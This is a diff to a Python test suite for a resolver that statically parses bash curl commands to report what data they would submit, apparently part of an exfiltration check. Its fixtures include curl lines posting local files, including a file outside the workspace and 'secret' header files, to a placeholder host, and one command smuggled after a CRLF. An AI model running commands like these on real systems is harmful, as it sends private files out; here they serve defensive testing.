@@ -28,7 +28,7 @@ class BashSubmissionResolutionTest(unittest.TestCase):
             )
 
         self.assertEqual(
-            "bash-submission-resolver-v2-component-safe-data-binary-file",
+            "bash-submission-resolver-v4-fail-closed-multiline-data-binary-file",
             BASH_SUBMISSION_RESOLVER_VERSION,
         )
         self.assertEqual(("public",), resolved[0].submitted_values)
@@ -38,6 +38,20 @@ class BashSubmissionResolutionTest(unittest.TestCase):
             ("public",),
             extract_bash_http_submissions(command)[0].submitted_values,
         )
+
+    def test_multiline_static_submission_is_resolved_by_its_segment(self) -> None:
+        command = "printf ready\r\ncurl --data public https://example.invalid"
+        with tempfile.TemporaryDirectory() as temporary_directory:
+            workspace = Path(temporary_directory)
+            resolved = resolve_bash_http_submissions(
+                command,
+                workspace_root=workspace,
+                execution_cwd=workspace,
+            )
+
+        self.assertEqual(1, len(resolved))
+        self.assertEqual(1, resolved[0].segment_index)
+        self.assertEqual(("public",), resolved[0].submitted_values)
 
     def test_relative_file_body_is_resolved_without_executing_curl(self) -> None:
         self._require_component_safe()
@@ -93,12 +107,41 @@ class BashSubmissionResolutionTest(unittest.TestCase):
         self.assertEqual(("inline", "file payload"), resolved[0].submitted_values)
         self.assertEqual("resolved_file", resolved[0].extraction)
 
+    def test_common_non_payload_options_do_not_disable_file_resolution(self) -> None:
+        self._require_component_safe()
+        with tempfile.TemporaryDirectory() as temporary_directory:
+            workspace = Path(temporary_directory)
+            (workspace / "payload.txt").write_text("public", encoding="utf-8")
+            commands = (
+                "curl --max-time 1 --data-binary @payload.txt https://example.invalid",
+                "curl --max-time=1 --data-binary @payload.txt https://example.invalid",
+                "curl -m1 --data-binary @payload.txt https://example.invalid",
+                "curl -H 'Content-Type: text/plain' --data-binary @payload.txt "
+                "https://example.invalid",
+                "curl --data-binary @payload.txt --retry 2 https://example.invalid",
+            )
+            for command in commands:
+                with self.subTest(command=command):
+                    resolved = resolve_bash_http_submissions(
+                        command,
+                        workspace_root=workspace,
+                        execution_cwd=workspace,
+                    )
+                    self.assertEqual("evaluated", resolved[0].status)
+                    self.assertEqual(("public",), resolved[0].submitted_values)
+
     def test_unsupported_references_return_value_free_reasons(self) -> None:
         with tempfile.TemporaryDirectory() as temporary_directory:
             workspace = Path(temporary_directory)
             outside = workspace.parent / "outside-payload.txt"
             outside.write_text("outside secret", encoding="utf-8")
             cases = {
+                "curl -H @secret-header.txt --data-binary @payload.txt "
+                "https://example.invalid": "header_file_reference_unsupported",
+                "curl --header=@secret-header.txt --data-binary @payload.txt "
+                "https://example.invalid": "header_file_reference_unsupported",
+                "curl -H@secret-header.txt --data-binary @payload.txt "
+                "https://example.invalid": "header_file_reference_unsupported",
                 "curl --data-binary @../outside-payload.txt https://example.invalid": (
                     "file_reference_outside_workspace"
                 ),
